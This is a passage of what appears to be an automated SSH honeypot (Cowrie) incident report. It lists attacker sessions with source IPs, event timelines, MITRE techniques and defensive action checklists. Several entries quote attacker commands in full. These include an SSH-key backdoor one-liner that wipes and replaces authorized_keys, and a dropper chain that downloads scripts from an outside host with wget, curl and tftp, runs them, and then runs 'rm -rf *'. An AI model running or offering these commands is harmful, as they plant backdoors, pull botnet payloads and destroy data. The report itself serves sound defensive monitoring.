| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:45:41` | `cowrie.session.connect` |
| `2026-09-24 09:45:41` | `cowrie.client.version` |
| `2026-09-24 09:45:41` | `cowrie.client.kex` |
| `2026-09-24 09:45:41` | `cowrie.login.success` |
| `2026-09-24 09:45:42` | `cowrie.session.params` |
| `2026-09-24 09:45:42` | `cowrie.command.input` |
| `2026-09-24 09:45:42` | `cowrie.command.failed` |
| `2026-09-24 09:45:42` | `cowrie.log.closed` |
| `2026-09-24 09:45:43` | `cowrie.session.params` |
| `2026-09-24 09:45:43` | `cowrie.command.input` |
| `2026-09-24 09:45:43` | `cowrie.session.file_download` |
| `2026-09-24 09:45:43` | `cowrie.log.closed` |
| `2026-09-24 09:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.57.47[.]63` to AbuseIPDB if not already reported
- [ ] Block `31.57.47[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32480f3c10bd

| Field | Detail |
|---|---|
| **Source IP** | `31.57.47[.]63` |
| **First Seen** | 2026-09-24 09:45 |
| **Last Seen** | 2026-09-24 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:45:43` | `cowrie.session.connect` |
| `2026-09-24 09:45:43` | `cowrie.client.version` |
| `2026-09-24 09:45:43` | `cowrie.client.kex` |
| `2026-09-24 09:45:44` | `cowrie.login.success` |
| `2026-09-24 09:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.57.47[.]63` to AbuseIPDB if not already reported
- [ ] Block `31.57.47[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a461f13ad6a1

| Field | Detail |
|---|---|
| **Source IP** | `31.57.47[.]63` |
| **First Seen** | 2026-09-24 09:45 |
| **Last Seen** | 2026-09-24 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:45:44` | `cowrie.session.connect` |
| `2026-09-24 09:45:44` | `cowrie.client.version` |
| `2026-09-24 09:45:44` | `cowrie.client.kex` |
| `2026-09-24 09:45:44` | `cowrie.login.success` |
| `2026-09-24 09:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.57.47[.]63` to AbuseIPDB if not already reported
- [ ] Block `31.57.47[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b153845fd69

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-09-24 09:52 |
| **Last Seen** | 2026-09-24 09:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:52:13` | `cowrie.session.connect` |
| `2026-09-24 09:52:13` | `cowrie.client.version` |
| `2026-09-24 09:52:13` | `cowrie.client.kex` |
| `2026-09-24 09:52:14` | `cowrie.login.success` |
| `2026-09-24 09:52:14` | `cowrie.session.params` |
| `2026-09-24 09:52:14` | `cowrie.command.input` |
| `2026-09-24 09:52:14` | `cowrie.command.failed` |
| `2026-09-24 09:52:14` | `cowrie.log.closed` |
| `2026-09-24 09:52:15` | `cowrie.session.params` |
| `2026-09-24 09:52:15` | `cowrie.command.input` |
| `2026-09-24 09:52:15` | `cowrie.session.file_download` |
| `2026-09-24 09:52:15` | `cowrie.log.closed` |
| `2026-09-24 09:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e380d6fae053

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-09-24 09:52 |
| **Last Seen** | 2026-09-24 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:52:15` | `cowrie.session.connect` |
| `2026-09-24 09:52:15` | `cowrie.client.version` |
| `2026-09-24 09:52:15` | `cowrie.client.kex` |
| `2026-09-24 09:52:15` | `cowrie.login.success` |
| `2026-09-24 09:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe78092085fe

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-09-24 09:52 |
| **Last Seen** | 2026-09-24 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:52:16` | `cowrie.session.connect` |
| `2026-09-24 09:52:16` | `cowrie.client.version` |
| `2026-09-24 09:52:16` | `cowrie.client.kex` |
| `2026-09-24 09:52:16` | `cowrie.login.success` |
| `2026-09-24 09:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4107637fc75f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 09:54 |
| **Last Seen** | 2026-09-24 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:54:43` | `cowrie.session.connect` |
| `2026-09-24 09:54:43` | `cowrie.client.version` |
| `2026-09-24 09:54:43` | `cowrie.client.kex` |
| `2026-09-24 09:54:43` | `cowrie.login.success` |
| `2026-09-24 09:54:43` | `cowrie.direct-tcpip.request` |
| `2026-09-24 09:54:43` | `cowrie.direct-tcpip.data` |
| `2026-09-24 09:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a368623b2be

| Field | Detail |
|---|---|
| **Source IP** | `176.65.134[.]121` |
| **First Seen** | 2026-09-24 10:00 |
| **Last Seen** | 2026-09-24 10:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, root, admin` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:00:11` | `cowrie.session.connect` |
| `2026-09-24 10:00:12` | `cowrie.login.failed` |
| `2026-09-24 10:00:13` | `cowrie.login.success` |
| `2026-09-24 10:00:13` | `cowrie.session.params` |
| `2026-09-24 10:00:14` | `cowrie.command.input` |
| `2026-09-24 10:00:14` | `cowrie.command.failed` |
| `2026-09-24 10:00:14` | `cowrie.command.input` |
| `2026-09-24 10:00:14` | `cowrie.command.failed` |
| `2026-09-24 10:00:15` | `cowrie.command.input` |
| `2026-09-24 10:00:15` | `cowrie.command.failed` |
| `2026-09-24 10:00:15` | `cowrie.log.closed` |
| `2026-09-24 10:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `176.65.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9718f5cc8ec

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 10:21 |
| **Last Seen** | 2026-09-24 10:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:21:49` | `cowrie.session.connect` |
| `2026-09-24 10:21:49` | `cowrie.login.success` |
| `2026-09-24 10:21:50` | `cowrie.session.params` |
| `2026-09-24 10:21:51` | `cowrie.command.input` |
| `2026-09-24 10:21:51` | `cowrie.command.input` |
| `2026-09-24 10:21:51` | `cowrie.session.file_download` |
| `2026-09-24 10:21:51` | `cowrie.session.file_download` |
| `2026-09-24 10:21:52` | `cowrie.session.file_download` |
| `2026-09-24 10:21:52` | `cowrie.session.file_download` |
| `2026-09-24 10:21:52` | `cowrie.session.file_download.failed` |
| `2026-09-24 10:21:52` | `cowrie.session.file_download` |
| `2026-09-24 10:21:52` | `cowrie.session.file_download` |
| `2026-09-24 10:22:06` | `cowrie.log.closed` |
| `2026-09-24 10:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7825c67a8d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 10:28 |
| **Last Seen** | 2026-09-24 10:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:28:45` | `cowrie.session.connect` |
| `2026-09-24 10:28:45` | `cowrie.client.version` |
| `2026-09-24 10:28:45` | `cowrie.client.kex` |
| `2026-09-24 10:28:46` | `cowrie.login.success` |
| `2026-09-24 10:28:46` | `cowrie.direct-tcpip.request` |
| `2026-09-24 10:28:46` | `cowrie.direct-tcpip.data` |
| `2026-09-24 10:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-948a471afb31

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 10:30 |
| **Last Seen** | 2026-09-24 10:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:30:18` | `cowrie.session.connect` |
| `2026-09-24 10:30:18` | `cowrie.login.success` |
| `2026-09-24 10:30:18` | `cowrie.session.params` |
| `2026-09-24 10:30:20` | `cowrie.command.input` |
| `2026-09-24 10:30:20` | `cowrie.command.input` |
| `2026-09-24 10:30:20` | `cowrie.session.file_download` |
| `2026-09-24 10:30:20` | `cowrie.session.file_download` |
| `2026-09-24 10:30:20` | `cowrie.session.file_download` |
| `2026-09-24 10:30:21` | `cowrie.session.file_download` |
| `2026-09-24 10:30:21` | `cowrie.session.file_download.failed` |
| `2026-09-24 10:30:21` | `cowrie.session.file_download` |
| `2026-09-24 10:30:21` | `cowrie.session.file_download` |
| `2026-09-24 10:30:35` | `cowrie.log.closed` |
| `2026-09-24 10:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590d41221bc2

| Field | Detail |
|---|---|
| **Source IP** | `172.236.127[.]133` |
| **First Seen** | 2026-09-24 10:30 |
| **Last Seen** | 2026-09-24 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:30:32` | `cowrie.session.connect` |
| `2026-09-24 10:30:32` | `cowrie.login.success` |
| `2026-09-24 10:30:32` | `cowrie.session.params` |
| `2026-09-24 10:30:32` | `cowrie.command.input` |
| `2026-09-24 10:30:32` | `cowrie.command.input` |
| `2026-09-24 10:30:32` | `cowrie.command.failed` |
| `2026-09-24 10:30:32` | `cowrie.command.input` |
| `2026-09-24 10:30:32` | `cowrie.command.failed` |
| `2026-09-24 10:30:32` | `cowrie.command.input` |
| `2026-09-24 10:30:32` | `cowrie.log.closed` |
| `2026-09-24 10:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.127[.]133` to AbuseIPDB if not already reported
- [ ] Block `172.236.127[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05d978a29f9

| Field | Detail |
|---|---|
| **Source IP** | `79.108.220[.]136` |
| **First Seen** | 2026-09-24 10:39 |
| **Last Seen** | 2026-09-24 10:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:39:19` | `cowrie.session.connect` |
| `2026-09-24 10:39:19` | `cowrie.client.version` |
| `2026-09-24 10:39:20` | `cowrie.client.kex` |
| `2026-09-24 10:39:21` | `cowrie.login.success` |
| `2026-09-24 10:39:22` | `cowrie.session.params` |
| `2026-09-24 10:39:22` | `cowrie.command.input` |
| `2026-09-24 10:39:22` | `cowrie.command.failed` |
| `2026-09-24 10:39:22` | `cowrie.log.closed` |
| `2026-09-24 10:39:23` | `cowrie.session.params` |
| `2026-09-24 10:39:23` | `cowrie.command.input` |
| `2026-09-24 10:39:23` | `cowrie.session.file_download` |
| `2026-09-24 10:39:23` | `cowrie.log.closed` |
| `2026-09-24 10:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.108.220[.]136` to AbuseIPDB if not already reported
- [ ] Block `79.108.220[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8b6597f31c

| Field | Detail |
|---|---|
| **Source IP** | `79.108.220[.]136` |
| **First Seen** | 2026-09-24 10:39 |
| **Last Seen** | 2026-09-24 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:39:24` | `cowrie.session.connect` |
| `2026-09-24 10:39:24` | `cowrie.client.version` |
| `2026-09-24 10:39:24` | `cowrie.client.kex` |
| `2026-09-24 10:39:25` | `cowrie.login.success` |
| `2026-09-24 10:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.108.220[.]136` to AbuseIPDB if not already reported
- [ ] Block `79.108.220[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab85c0f8f98

| Field | Detail |
|---|---|
| **Source IP** | `79.108.220[.]136` |
| **First Seen** | 2026-09-24 10:39 |
| **Last Seen** | 2026-09-24 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:39:25` | `cowrie.session.connect` |
| `2026-09-24 10:39:25` | `cowrie.client.version` |
| `2026-09-24 10:39:26` | `cowrie.client.kex` |
| `2026-09-24 10:39:27` | `cowrie.login.success` |
| `2026-09-24 10:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.108.220[.]136` to AbuseIPDB if not already reported
- [ ] Block `79.108.220[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ee7ae7ca6c

| Field | Detail |
|---|---|
| **Source IP** | `43.134.49[.]202` |
| **First Seen** | 2026-09-24 10:46 |
| **Last Seen** | 2026-09-24 10:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:46:57` | `cowrie.session.connect` |
| `2026-09-24 10:46:57` | `cowrie.client.version` |
| `2026-09-24 10:46:57` | `cowrie.client.kex` |
| `2026-09-24 10:46:58` | `cowrie.login.success` |
| `2026-09-24 10:46:59` | `cowrie.session.params` |
| `2026-09-24 10:46:59` | `cowrie.command.input` |
| `2026-09-24 10:46:59` | `cowrie.command.failed` |
| `2026-09-24 10:47:00` | `cowrie.log.closed` |
| `2026-09-24 10:47:01` | `cowrie.session.params` |
| `2026-09-24 10:47:01` | `cowrie.command.input` |
| `2026-09-24 10:47:01` | `cowrie.session.file_download` |
| `2026-09-24 10:47:01` | `cowrie.log.closed` |
| `2026-09-24 10:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.49[.]202` to AbuseIPDB if not already reported
- [ ] Block `43.134.49[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8054a983ee79

| Field | Detail |
|---|---|
| **Source IP** | `43.134.49[.]202` |
| **First Seen** | 2026-09-24 10:47 |
| **Last Seen** | 2026-09-24 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:47:01` | `cowrie.session.connect` |
| `2026-09-24 10:47:01` | `cowrie.client.version` |
| `2026-09-24 10:47:02` | `cowrie.client.kex` |
| `2026-09-24 10:47:03` | `cowrie.login.success` |
| `2026-09-24 10:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.49[.]202` to AbuseIPDB if not already reported
- [ ] Block `43.134.49[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c8f35593de

| Field | Detail |
|---|---|
| **Source IP** | `43.134.49[.]202` |
| **First Seen** | 2026-09-24 10:47 |
| **Last Seen** | 2026-09-24 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:47:03` | `cowrie.session.connect` |
| `2026-09-24 10:47:03` | `cowrie.client.version` |
| `2026-09-24 10:47:03` | `cowrie.client.kex` |
| `2026-09-24 10:47:04` | `cowrie.login.success` |
| `2026-09-24 10:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.49[.]202` to AbuseIPDB if not already reported
- [ ] Block `43.134.49[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b476d15878a

| Field | Detail |
|---|---|
| **Source IP** | `31.57.27[.]21` |
| **First Seen** | 2026-09-24 10:48 |
| **Last Seen** | 2026-09-24 10:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 10:48:45` | `cowrie.session.connect` |
| `2026-09-24 10:48:45` | `cowrie.client.version` |
| `2026-09-24 10:48:45` | `cowrie.client.kex` |
| `2026-09-24 10:48:45` | `cowrie.login.success` |
| `2026-09-24 10:48:46` | `cowrie.session.params` |
| `2026-09-24 10:48:46` | `cowrie.command.input` |
